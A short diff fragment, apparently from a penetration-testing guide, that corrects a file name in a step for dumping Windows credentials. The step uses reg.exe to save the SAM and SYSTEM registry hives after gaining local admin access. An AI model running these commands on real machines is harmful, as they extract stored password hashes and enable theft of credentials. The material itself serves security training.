@@ -21,7 +21,7 @@ There are three registry hives that we can copy if we have local admin access on
 Launching CMD as an admin will allow us to run reg.exe to save copies of the registry hives.
 
 ```cmd-session
-reg.exe save hklm\sam C:\sam.sav
+reg.exe save hklm\sam C:\sam.save
 
 reg.exe save hklm\system C:\system.save
 
